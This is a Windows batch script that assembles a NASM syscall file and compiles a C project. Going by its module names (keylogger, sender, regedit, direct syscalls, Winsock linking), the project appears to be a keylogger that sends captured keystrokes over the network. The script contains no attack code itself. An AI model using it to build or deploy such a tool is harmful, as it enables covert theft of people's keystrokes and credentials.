@echo off
setlocal

set CC=gcc
set CFLAGS=-I modules
set LDFLAGS=-lws2_32
set OUT=main.exe

:: Compile syscalls.asm to syscalls.obj using NASM
if exist asm\syscalls.obj (
    echo [*] syscalls.obj already exists. Skipping NASM compilation.
) else (
    echo [*] Compiling syscalls.asm...
    nasm -f win64 asm\syscalls.asm -o asm\syscalls.obj
    if errorlevel 1 (
        echo [!] Error while compiling syscalls.asm
        goto end
    )
)

:: List of source files
set SOURCES= ^
src\main.c ^
modules\hash-tables\PressedKeys.c ^
modules\hash-tables\KeysCombinations.c ^
modules\hash-tables\Keys.c ^
modules\sets\Set.c ^
modules\regedit\regedit.c ^
modules\sender\sender.c ^
modules\utils\common\utils.c ^
modules\utils\init\initializer.c ^
modules\utils\mutex\mutex-handler.c ^
modules\keylogger\keylogger.c ^
modules\syscalls\syscalls.c ^
asm\syscalls.obj

:: Compile the project
echo [*] Compiling the project...
%CC% %SOURCES% %CFLAGS% -o %OUT% %LDFLAGS%

if errorlevel 1 (
    echo [!] Error while compiling the project
    goto end
)

echo.
echo [✓] Build complete. Output: %OUT%

:end
endlocal
pause
